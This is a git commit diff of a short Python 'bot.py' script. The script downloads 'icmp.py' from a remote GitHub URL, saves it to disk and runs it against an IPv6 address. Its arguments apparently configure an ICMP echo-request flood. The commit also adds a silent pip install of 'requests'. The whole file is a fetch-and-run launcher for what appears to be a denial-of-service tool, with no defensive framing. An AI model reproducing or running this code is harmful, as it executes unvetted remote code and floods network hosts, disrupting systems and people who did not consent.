18932abb944445f8cc5e3ce8623c9450b64c5c1d
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2025-08-14 09:19:13 +0700

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,5 +1,12 @@
-import os, requests
+import os
+try:
+    import requests
+except:
+    import subprocess
+    import sys
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+    import requests
 with open('D:\\icmp.py','w') as f:
     f.write(requests.get('https://raw.githubusercontent.com/Hex1629/pretest/refs/heads/main/icmp.py').text)
 
-os.system('cmd.exe \k python D:\\icmp.py fe80::f24f:a5a0:fe71:efbb 1200 250000 ERQ 25000
+os.system('cmd.exe \k python D:\\icmp.py fe80::f24f:a5a0:fe71:efbb 1200 2500 ERQ 2500')
